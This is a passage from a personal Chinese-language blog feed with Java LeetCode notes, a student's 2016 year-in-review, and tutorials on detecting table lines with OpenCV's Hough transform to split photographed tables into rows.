]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode踩坑集锦</title>
    <url>/2017/02/05/LeetCode/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>寒假（假装）看完《数据结构与算法分析》之后决定是时候开始做LeetCode的题目了，在这里记录下一些LeetCode过程中遇到的坑，做LeetCode不仅是对算法的一种考验，也是对Java基础知识的一种考查，在Java基础并不是太好的现在做一定会漏洞百出，在这里统一做一个记录，也会写下对一些题目的想法。<br><a id="more"></a></p>
<h2 id="LeetCode"><a href="#LeetCode" class="headerlink" title="LeetCode"></a>LeetCode</h2><h3 id="Two-Sum"><a href="#Two-Sum" class="headerlink" title="Two Sum"></a>Two Sum</h3><p>直观上的方法是遍历所有元素对找出答案，看了解答以后发现可以用Hash表实现，Hash表可以进行对另一个元素的快速查找并返回对应的位置。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        map.put(nums[i], i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (Integer num : map.keySet()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(target - num) &amp;&amp; !Objects.equals(map.get(num), map.get(target - num))) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;map.get(num), map.get(target - num)&#125;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面的代码在用例[3,3] 6的时候返回结果为null，原因是第7行中第二个判断条件不成立，由于构建hash表的时候后面一个[3,1]覆盖了前面的[3,0]导致无法同时找到两个位置。（提醒了hash表一对一的性质，后面加入的元素如果key相同会覆盖前面的元素）</p>
<p>解决办法是不遍历key而是直接遍历nums数组，比较循环的索引和hash表的value，这样可以保证找到对应的那个位置不同的元素位置。</p>
<h3 id="Rotate-Array"><a href="#Rotate-Array" class="headerlink" title="Rotate Array"></a>Rotate Array</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] temp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        temp[<span class="number">0</span>] = nums[nums.length - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; nums.length-<span class="number">1</span>; j++) &#123;</span><br><span class="line">            temp[j + <span class="number">1</span>] = nums[j];</span><br><span class="line">        &#125;</span><br><span class="line">        nums = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>错误的原因是没有理解数组元素传递的本质是对数组对象引用的值传递，刚开始看到这题目觉得怎么可以用java做，java都是值传递无法改变原来数组。上面的做法的结果是把一个新的数组对象的引用赋给了nums的一个拷贝，但是原来的nums并没有引用到新的地址，所以原nums还是保持不变。</p>
<p>查了相关资料了解到数组元素的传递与对象一样（数组也可以看成new int[]产生的对象），传递的是数组的引用的拷贝，可以通过这个引用来修改原数组的数据。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Algorithm</tag>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>2016年度总结</title>
    <url>/2017/01/20/2016%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="2016年度总结"><a href="#2016年度总结" class="headerlink" title="2016年度总结"></a>2016年度总结</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>许多人在跟我聊天的时候感慨，时间怎么过得这么快，不知不觉自己就是二十多的人了，过几年就要奔三了。相反地，我却觉得时间过得却不是那么快，因为自己确实在随着时间而改变，而且这样的改变是自己实实在在可以感受到的。从初中开始过来的这几年，可以说是一年一个样子，每次翻看自己一年前写的东西都会看到当时的幼稚与无知，自己也有着许许多多的习惯、看法、认识在随着时间推移在改变着。</p>
<p>而2016年是对身边每一个像我一样的新生都十分关键的一年，经历了身份、时空的转变，带来的是各种观念的迅速变化，但感到庆幸的是我并不惧怕改变。</p>
<p>这大概就是这段时间的必然，我们在快速成长着，不断地丢下之前的想法，不断获取新的东西与认知，不知道这样的改变还会持续多久，但是可以确定的是我确实是在朝着对的方向成长着。</p>
<p>之前的习惯是在每年生日的时候写下一些东西作为记录，但是今年因为忙碌而落下了，在学期结束的时候正好自己所在的两个团队都要求有一篇总结，虽然分别是年度的和学期的，我还是一并写成年度的，大概高中时期的那些种种在现在看来毕竟是过去了，所以这篇总结会分成两部分，先是来华科前的时期，主要内容在来华科后的时期。作为一篇写给别人看的总结就不包含那些生活上的东西了。<br><a id="more"></a></p>
<h2 id="高中"><a href="#高中" class="headerlink" title="高中"></a>高中</h2><p>似乎身边每一个人说起自己的高三时光，都是无尽的考试和补课，和最终那一次高考的种种经历。在这个明确的人生分水岭之前，每个人都不得不正视自己的成绩。</p>
<p>但奇怪（或许不）的是，我对高中的印象却完完全全没有上面说的那些东西，因为它们都随着高考的结束而截止了。我能记住的只有高中生活中那些无关于学习的那些，那些在高三的忙碌中偷得的闲暇，那些三年来朝夕相处的珍贵。</p>
<p>而成绩与最后的结果，现在看来都是一种必然，无论最终的结果如何，都会有一种方式让我好好珍视现在，像高中语文老师寄言的那样：人生的每个阶段都会有每个阶段的痛苦与快乐。</p>
<p>我不曾为自己之前做过的任何一个决定后悔过，它们的结果或已变成好的那方面，或已不再重要。性格如此，我只关注现在的事情，过去的事情会很快放下，从而尽快找到一种适合的方式好好面对当下的那些或好或坏的事情。</p>
<p>在高中时期没有想过自己一定会去哪一个学校，但直觉告诉我一定会有一条路在那里等着我，我没有计划过高考要考多少分，也没有拼命地为了所谓的不浪费去各种揣度志愿应该怎么填，在高中的最后阶段，支持着我的是再也不以分数高低论断一个人的成败的未来和学习真正愿意为之付出精力的东西。</p>
<p>最令我感到幸运的是我在很早的时候我就知道愿意去为什么付出自己的热血，这讲起来又是另一个故事了，但是从我有大学专业这个概念以来，我从来没有考虑过除计算机相关以外的任何一个专业。所以在暑假高考成绩出来的那一刻起华科就成了我最好且是唯一的选择。我的志愿在系统开放十分钟以内就填好了，我想这就是我前面所说的那种必然。</p>
<h2 id="华科"><a href="#华科" class="headerlink" title="华科"></a>华科</h2><p>来华科以后的生活似乎就成变多线程的了，加入了很多的学生组织，一度让我在时间安排上感到非常爆炸，但是不管怎么样接下的锅我都会好好背到底的。对来华科以后这段时间的总结就按身份不同分成几个方面吧。</p>
<h3 id="联创团队"><a href="#联创团队" class="headerlink" title="联创团队"></a>联创团队</h3><p>关于华科的一切就是从那时开始了解的，而对于华科的三大团队网上很高的评价和咨询群中表现出来的态度就足够令人向往，而令一方面也让我对自己的水平心生怀疑，虽然早就有学计算机的打算但之前却没有条件让我在这条路上更深一步，这样的心态甚至让我一度在联创招新的时候不敢去投出一份所谓的简历。正如那时所说的那样，我深知自己的水平还不足以加入联创，但是我却有了去提升自己的欲望和前进的动力。</p>
<p>当时在招新快要结束的时候正好班主任（大四学长）来我寝室，闲聊中我说起报名这事，他表示：报个名又不会有什么损失，为什么不试一试呢？现在看来那时候我的心态确实很奇怪，想去追求的东西因为担心自己的能力连第一步都不敢踏出，大概是太过于担心自己会失败吧。    </p>
<p>所以在离报名截止还有两天的时候我同时报了联创和冰岩的名，第一次面试是冰岩的一面，因为太过紧张以至于语无论次，讲起来也没有什么逻辑。面试以后就觉得自己跪了。之后是联创的笔试，只知道Android会考Java，所以提前一天买了本Java书看，本来也没有对笔试抱多大的希望，题目里面关于面向对象的内容还是根据之前看过的C++的那套东西答的。所以在后面收到二面通知的时候还是觉得十分惊喜的。</p>
<p>面试我的是朱一百和王启萌，记得那天我们聊的挺开心的，也是我第一次看到808，那时候第一次感觉到自己离这样一个团队这么近。之后给了三个礼拜的时间准备熬测，正好国庆放假，把买的Java和Android的书带回去用最快的速度看，感觉那样这么用心地为了一个目标努力的时候真是非常难得。</p>
<p>再之后的事情似乎又在意料之内了，越到后面越感到自己能实现这件事，所以这件事也就这样实现了。</p>
<p>联创的一切也如同我想的那样，有一群志同道合的伙伴和各种方面都非常强的聚聚学长。加入联创的第一个收获就是让我能看到更大的世界是什么样子，知道同龄的人可以做到什么样子，更重要的是，他们就在我身边。这样的氛围我想在其他的任何地方都很难找到。</p>
<p>实习三个多月，从第一个礼拜没有安卓基础写出第一个APP，接到第一个Java项目，到组队一起写出一个游戏打比赛，再到自己去实现自己的一些想法，其中的成长不言而喻。</p>
<p>做APP的过程其实在DR里面已经有记录，在这里就不一一细数。总的看来，有一些收获对我以后的学习有着很大的帮助：</p>
<ul>
<li>学会使用Google，习惯在英文环境下解决问题，从一开始对满屏的英文不知所措到后面可以筛选出自己想要的信息，对我的英语能力也是一种提升。（感谢Mentor顺手改的搜索结果显示语言）</li>
<li>看文档写代码而不是看Demo跟着写，一开始遇到不会实现的东西都是先找别人的实现再套用到自己的情境中，后来明白官方提供的文档就是最好的参考资料，虽然有些时候看Demo写可以更快的实现，但是回过头来看看文档总能发现一些新东西从而加强自己的理解。毕竟只有自己写出来的东西才是自己的。</li>
<li>讲究代码的规范性问题。这一点Mentor在对我代码的Review中反复强调了很多次，希望我从一开始就养成好的习惯。</li>
<li>熟悉自己的操作环境，提高效率。花了非常多的时间来折腾Linux，目的就是为了给自己一个可以排除其他干扰高效率地工作的环境。熟悉各种快捷键和插件也是锻炼的一部分。</li>
<li>重视基础。有很多前辈告诉我基础内容非常重要，尤其是像数据结构、算法这样的内容看似平常用不到，但是关键时候看的往往就是这样的基本功。所以我开始想去花一些时间认真地静下心来补一补这些基础内容。</li>
<li>开始写博客来记录一些东西。建了自己的博客，虽然现在只有手头项目相关的三篇博文，很大一部分原因是我认为博文内容一定要是自己理解比较深刻的一些东西才值得写。目前自己水平不高的情况下瞎写一些东西也没有什么价值，应该在之后某个时候觉得自己对某个东西有自己的理解的时候才会好好地把这些分享给别人吧。</li>
<li>Git与团队合作，目前合作的两个项目都是通过git完成的，一开始用git出现了很多问题但是到后面熟悉以后就可以好好利用git的功能了。</li>
</ul>
<p>其实学到的东西远不止上面总结的这些，很多东西都是从与其他人的接触中慢慢学会的，总之很荣幸可以接触到这个学校最优秀的一群人。</p>
<h3 id="班长"><a href="#班长" class="headerlink" title="班长"></a>班长</h3><p>大学接下班长职务是想发挥一下自己搞事的天赋，希望能够通过自己的一些行动去为大家做一些事情。平时给同学、班委开会也是对自己的锻炼。感谢在最忙的那些时候有其他的班委主动帮我分担。班上有一群可爱的同学们，虽然说大学同学不似高中那样朝夕相处，但是我希望大家可以一起留下一些美好的回忆。</p>
<h3 id="美团点评技术俱乐部"><a href="#美团点评技术俱乐部" class="headerlink" title="美团点评技术俱乐部"></a>美团点评技术俱乐部</h3><p>一开始自己对学生组织的打算是一个技术团队和学生组织。因为暑假水群的时候就跟安祺和负责科创的大叔聊过，开学俱乐部招新的时候也跟安祺大叔简单聊了一下，于是就来了刚成立的美团。</p>
<p>因为美团刚成立成员也特别少，所以大家很快就熟悉了， 美团的群也成了我们日常闲扯的地方。而学院今年为科创的各个俱乐部新装修的场地也就在我寝室的顶楼，对于我们来说是一个大福利了。</p>
<p>后来通过学院接到的自己和唐艺峰合作的第一个项目，做一个表格内容识别的东西。在那个时候我才刚有一些Java基础，在想接不接的时候又想起了自己考虑报不报联创一样的情景。这次我没有太多犹豫，一是大一就有可能接到项目做很难得，二是项目对自己的锻炼也是非常大的，不给自己一些压力就不会做成一些事情。</p>
<p>这个项目中间虽然经历了很多日常的绝望，像前辈说的那样踩过了很多的坑，例如PM改需求，但是到最后总算是把第一期完成了，过程中也有了自己三篇博文。</p>
<p>后面学院又跟企业合作拿到了一批新的项目，估计下学期会开始做。在科创这边的活动有学院的支持以后在项目方面就有了保证。希望俱乐部这边能在学院的支持下可以好好发展。</p>
<h3 id="学生会宣传部"><a href="#学生会宣传部" class="headerlink" title="学生会宣传部"></a>学生会宣传部</h3><p>正如招新的时候所说的，学生会是一个大家庭，在宣传部认识了很多非常可爱的学姐和学长，也结识了一些跟我同届的部员们。</p>
<p>宣传部做出来的东西是实实在在可以被大家看到和关注的，看到自己做出来的海报被贴出来的感觉真的非常好。尝试了第一次用比较长的一段时间用心做一张真正意义上的海报，第一次用AE撸出第一个视频被大家转发。</p>
<p>宣传部的大家都很有爱（虽然群里总是gaygay的），但是每次问一些问题总会有人回答。例会的零食、部长的宅舞、圣诞的贺卡……这一切回忆起来总是那么温馨。</p>
<p>这个学期接的锅其实就一张海报，视频的活还没有开始接，自己也因为联创的事情鸽了一些活动。下学期会好好弥补的。</p>
<h2 id="关于未来"><a href="#关于未来" class="headerlink" title="关于未来"></a>关于未来</h2><p>总结下来这一年的我似乎没有遇到什么太大的困难（或者说那些困难到现在看已经算不上了），一切都在向着充满希望的方向发展着。班主任曾对我们说过一句话：“大家都希望成为自己想要的样子，但是到最后大部分都成了自己愿意成为的样子。”计划总是赶不上变化的，我也是一个不善于计划的人，我对于自己未来的走向的改变总是在平时的一个个决定中促成的，好在现在看来还是走在应该走的路上。</p>
<p>从加入联创的那一刻起我已经决定不读研，知乎上看过一句话是：“大学把一件事做到牛逼才谈得上成功的大学生活。”那么我想这件事对于我一定是技术，有这样的氛围和条件让我去好好做这件事必然不会让我失望。我也希望自己能真正地专注在一件事情上。</p>
<p>虽然我不是一个理想主义者，但是现在的我是充满着希望的，因为我看到了我可以成为怎样的人，看到了未来的那些可能，知道了那样一部分自己的未来会是怎么一个样子。</p>
<p>但是不管自己的打算多么好，条件多么优越，始终不能变的是自己的努力，在这里也要告诫自己要Stay Hungry, Stay Foolish.时刻保持清醒，保持自知。</p>
<p><strong>“你要克服的是你的虚荣心，是你的炫耀欲，你要对付的是你时刻想要出风头的小聪明。”——蔡千嬅</strong></p>
<p>共勉。</p>
]]></content>
      <categories>
        <category>Summary</category>
      </categories>
      <tags>
        <tag>Summary</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenCV处理拍照表格（三）</title>
    <url>/2016/12/09/OpenCV%E5%A4%84%E7%90%86%E6%8B%8D%E7%85%A7%E8%A1%A8%E6%A0%BC%EF%BC%88%E4%B8%89%EF%BC%89/</url>
    <content><![CDATA[<h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>在开始说明直线检测过程前先作个说明，由于直线检测的算法需要遍历每个像素，所以总的耗时比较长，在安卓上跑的时候直线检测的时间可能会长达两分钟，这是在测试过程中不能接受的，所以我将安卓上的代码整个迁移到了Idea中，关于Idea中<code>OpenCV</code>的配置，可以参见这个<a href="https://medium.com/@aadimator/how-to-set-up-opencv-in-intellij-idea-6eb103c1d45c" target="_blank" rel="noopener">教程</a>。</p>
<p>这个步骤的目的：这步中我们会检测出整张图片中满足条件的所有直线，再通过筛选选出横的表格框线，再利用检测出的表格框线来提取两个框线之间的内容即为表格中的一行。<br><a id="more"></a></p>
<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">cutImagesToRows</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ArrayList&lt;Double&gt; lineYs = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    ArrayList&lt;Double&gt; uniqueLineYs = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//lines:a special mat for find lines</span></span><br><span class="line">    Mat lines = <span class="keyword">new</span> Mat();</span><br><span class="line">    <span class="comment">//find lines and store in lines</span></span><br><span class="line">    Imgproc.HoughLinesP(dilateMuchPic, lines, <span class="number">1</span>, Math.PI / <span class="number">180</span>, Y_THRESHOLD,</span><br><span class="line">            Y_MINLINELENGTH, Y_MAXLINEGAP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the lines information from lines and store in lineYs</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; lines.rows(); i++) &#123;</span><br><span class="line">        <span class="keyword">double</span>[] points = lines.get(i, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">double</span> y1, y2;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//just need the horizontal lines</span></span><br><span class="line">        y1 = points[<span class="number">1</span>];</span><br><span class="line">        y2 = points[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// if it slopes, get the average of them, store the y-coordinate</span></span><br><span class="line">        <span class="keyword">if</span> (Math.abs(y1 - y2) &lt; <span class="number">30</span>) &#123;</span><br><span class="line">            lineYs.add((y1 + y2) / <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    getUniqueLines(lineYs, uniqueLineYs, <span class="number">10</span>);</span><br></pre></td></tr></table></figure>
<p>上面的注释里面讲得比较清楚，另外有一些解释：</p>
<ul>
<li><p>前面提到过<code>HoughLinesP</code>这个函数的第二个参数是一个特殊的<code>Mat</code>，也就是代码中的<code>lines</code>，它的<code>col</code>（列）的值为1，<code>row</code>（行）的值为检测出的所有直线 <strong>（这里要注意一下，我手上的书的这两个值正好相反，可能是标准不同，我这里用的是<code>OpenCV 3.1</code>）</strong>。每个<code>row</code>为一个<code>double[4]</code>，四个值分别对应着起始点的x,y坐标，终点的x,y坐标<strong>（图片的左上角为原点）</strong>。两个点连起来就是检测出的直线。可以看到这里我只取了1,3，对应的是起点和终点的y坐标。</p>
</li>
<li><p><code>if (Math.abs(y1 - y2) &lt; 30)</code>这句判断的目的是过滤掉竖直的直线（起始点y坐标之差显然大于30），并且允许横线有一定的倾斜（起始点可以有30像素的差距）。找到这样的一对点后，把它们的y坐标取平均值存入一个数组中。</p>
<p>​</p>
</li>
</ul>
<p>由于图片中一条直线的宽度不可能正好是一个像素，所以必然会出现一条直线检测出很多个y坐标的问题，下面这个方法就是为了找到这些多余的y坐标并取它们的平均值作为最终的y坐标。</p>
<p><code>getUniqueLines(lineYs, uniqueLineYs, 10);</code>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * filter the source coordinates, if some values are too close ,get the average of them</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> src    source coordinates list</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> dst    destination coordinate list</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> minGap the minimum gap between coordinates</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">getUniqueLines</span><span class="params">(ArrayList&lt;Double&gt; src, ArrayList&lt;Double&gt; dst, <span class="keyword">int</span> minGap)</span> </span>&#123;</span><br><span class="line">    Collections.sort(src); <span class="comment">//sort the source coordinates list</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; src.size(); i++) &#123;</span><br><span class="line">        <span class="keyword">double</span> sum = src.get(i);</span><br><span class="line">        <span class="keyword">double</span> num = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//when the distance between lines less than minGap, get the average of thema</span></span><br><span class="line">        <span class="keyword">while</span> (i != src.size() - <span class="number">1</span> &amp;&amp; src.get(i + <span class="number">1</span>) - src.get(i) &lt; minGap) &#123;</span><br><span class="line">            num++;</span><br><span class="line">            sum = sum + src.get(i + <span class="number">1</span>);</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (num == <span class="number">1</span>) &#123;</span><br><span class="line">            dst.add(src.get(i));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dst.add(((sum / num)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>minGap</code>：直线间距阈值，间距小于这个值的直线被处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">blockImages = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; uniqueLineYs.size(); i++) &#123;</span><br><span class="line">    Rect rect;</span><br><span class="line">    <span class="keyword">double</span> y = uniqueLineYs.get(i);</span><br><span class="line">    <span class="comment">//if not the last line</span></span><br><span class="line">    <span class="keyword">if</span> (i != uniqueLineYs.size() - <span class="number">1</span>) &#123;</span><br><span class="line">        rect = <span class="keyword">new</span> Rect((<span class="keyword">int</span>) (srcPic.width() * PADDING_LEFT_RIGHT),</span><br><span class="line">                (<span class="keyword">int</span>) (y + (uniqueLineYs.get(i + <span class="number">1</span>) - y) * PADDING_TOP_BOTTOM),</span><br><span class="line">                (<span class="keyword">int</span>) (srcPic.width() * (<span class="number">1</span> - PADDING_LEFT_RIGHT * <span class="number">2</span>)),</span><br><span class="line">                (<span class="keyword">int</span>) ((uniqueLineYs.get(i + <span class="number">1</span>) - y) * (<span class="number">1</span> - PADDING_TOP_BOTTOM * <span class="number">2</span>)));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//the last line</span></span><br><span class="line">        rect = <span class="keyword">new</span> Rect((<span class="keyword">int</span>) (srcPic.width() * PADDING_LEFT_RIGHT),</span><br><span class="line">                (<span class="keyword">int</span>) (y + (srcPic.height() - y) * PADDING_TOP_BOTTOM),</span><br><span class="line">                (<span class="keyword">int</span>) (srcPic.width() * (<span class="number">1</span> - PADDING_LEFT_RIGHT * <span class="number">2</span>)),</span><br><span class="line">                (<span class="keyword">int</span>) ((srcPic.height() - y) * (<span class="number">1</span> - PADDING_TOP_BOTTOM * <span class="number">2</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//cut the source picture to cutMat</span></span><br><span class="line">    Mat cutMat = <span class="keyword">new</span> Mat(srcPic, rect);</span><br><span class="line">    blockImages.add(cutMat);</span><br></pre></td></tr></table></figure>
<p>这步就是切割了，<code>blockImages</code>就是存放切割后的行图像的<code>ArrayList</code>。</p>
<p>关于<code>Rect</code>：<code>Rect</code>对象表示一个区域，可以作为<code>Mat</code>的构造参数传入来为目标区域创造一个<code>Mat</code>副本。四个参数分别代表了区域起始点的x,y坐标，区域长度和区域高度。</p>
<p>可以看到这里我使用了一个<code>PADDING</code>参数，来规定切割时距规定边缘的距离来避免把一些表格的边线切到图像中影响OCR的识别。</p>
<p>至于上面一篇博客中最后的红线是测试时用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">showMarkedLines</span><span class="params">(Mat src, ArrayList&lt;Double&gt; lines)</span> </span>&#123;</span><br><span class="line">    Mat showLines = <span class="keyword">new</span> Mat();</span><br><span class="line">    Imgproc.cvtColor(src, showLines, COLOR_GRAY2BGR);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">double</span> y : lines) &#123;</span><br><span class="line"></span><br><span class="line">        Point pt1 = <span class="keyword">new</span> Point(<span class="number">0</span>, y);</span><br><span class="line">        Point pt2 = <span class="keyword">new</span> Point(src.width(), y);</span><br><span class="line">        Imgproc.line(showLines, pt1, pt2, <span class="keyword">new</span> Scalar(<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>), <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Imgcodecs.imwrite(<span class="string">"C:/Users/visea/Desktop/test/java/cut/"</span> +</span><br><span class="line">            String.valueOf(colNum) +</span><br><span class="line">            <span class="string">".jpg"</span>, showLines);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>打印出来的，这里新建了一个<code>showLines</code>并且把原图像通过<code>Imgproc.cvtColor</code>方法转换成BGR图像并复制到<code>showLines</code>（不转化成彩色格式只能显示灰度图像）。</p>
<p>打印一条直线也比较简单，只要新建两个<code>Point</code>对象代表起始点和终点，这里我把x坐标设置为图像的起始x坐标，y坐标为之前得到的唯一的y值，所以可以看到画出来的线就是水平并且从开头一直到结束的。</p>
<p>画直线使用<code>Imgproc.line</code>方法，最后两个参数依次是BGR三个通道的值组成的<code>Scalar</code>对象，代表直线的颜色，以及画出的直线的宽度（以像素为单位）。</p>
<h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p>最后用<code>Imgcodecs.imwrite</code>将<code>Mat</code>写入文件就可以看到最终的效果了，在测试的时候尤其有用。</p>
<p><img src="/images/redLines1.jpg" alt="redlines1"></p>
<p>也可以把<code>blockImages</code>中的图输出出来看结果，因为做的时候没存档，所以只能用之后的图来说明一下了：</p>
<p><img src="/images/rows1.jpg" alt=""><img src="/images/rows2.jpg" alt=""></p>
<p>请忽略图中的红线，为之后的步骤绘制出来的，左右不完整是因为我设置了百分之二十的左右的<code>PADDING</code>，为了方便后面的找线与切割。</p>
<p>当然在找直线的过程中也可以把找到的图片打印出来感觉一下效果，下面分别是调试前出的图和最终参数调试后出来的图：</p>
<p>调试前：</p>
<p><img src="/images/blackLines1.jpg" alt=""></p>
<p>调试后：</p>
<p><img src="/images/blackLines2.jpg" alt=""></p>
]]></content>
      <categories>
        <category>Java</category>
        <category>OpenCV</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>OpenCV</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenCV处理拍照表格（二）</title>
    <url>/2016/12/02/OpenCV%E5%A4%84%E7%90%86%E6%8B%8D%E7%85%A7%E8%A1%A8%E6%A0%BC%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    <content><![CDATA[<p>先来看看上次处理后的整张图片效果：</p>
<p><img src="/images/afterDilate.jpg" alt="afterdilate"></p>
<p>这里发现我将图片的颜色已经反相了，这是考虑到下一步的直接检测必须以白色像素为内容。做法在上一篇提到过，交换两段的位置就可以了。</p>
<p>可以看到噪点已经几乎没有了，文字的清晰度还是可以的。这里采用的kernel都是2x2的。</p>
<h3 id="直线检测"><a href="#直线检测" class="headerlink" title="直线检测"></a>直线检测</h3><p>下面就是比较关键步骤——直线检测了。</p>
<p>首先介绍一下openCV提供的直线检测算法：霍夫变换。<br><a id="more"></a></p>
<p>霍夫变换是图像处理中一个著名的检测算法，用于对二值图片中特定的几何形状的检测，直线检测只是其中比较常见的一种用法。从<a href="http://blog.csdn.net/holybin/article/details/20214169" target="_blank" rel="noopener">holybin的专栏</a>中复制一段介绍基本理论的内容：</p>
<blockquote>
<p>Hough直线检测的基本理论是二值图像中的任何点都可能是一些候选直线集合的一部分，所选的参数方式是每一行代表极坐标中的一个点，并且隐含的直线是通过象征点的，垂直于原点到此点的半径，即：检测的过程可以看成从图像中的一个个像素点出发，寻找每个点成为直线一部分的可能，再把这条线上可能的点连起来形成直线。在实际检测中，当一条线出现凹陷或是弯曲度时，也会检测出直线，只是不是一条完整长度直线，而是断断续续重叠相近的很多直线。&gt;<br>而对于图像中的一条直线而言，利用直角坐标系，可以表示为：<img src="http://hi.csdn.net/attachment/201109/25/0_1316925577jVvv.gif" alt="">的形式。那么，该直线上任意一点（x,y）变换到k-b参数空间将变成一个“点”。也就是说，将图像空间中所有的非零像素转换到k-b参数空间，那么它们将聚焦在一个点上。如此一来，参数空间中的一个局部峰值点就很有可能对应着原图像空间中的一条直线。不过，由于直线的斜率可能为无穷大，或者无穷小，那么，在k-b参数空间就不便于对直线进行刻画和描述。所以，研究人员提出采用极坐标参数空间进行直线检测。在极坐标系中，直线可以表述为以下形式：<img src="http://hi.csdn.net/attachment/201109/25/0_1316925607206o.gif" alt="">&gt;<img src="http://img.blog.csdn.net/20140301150643531?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvaG9seWJpbg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt=""></p>
</blockquote>
<p>更为详细的分析可以看<a href="http://blog.csdn.net/poem_qianmo/article/details/26977557" target="_blank" rel="noopener">浅墨的博客</a></p>
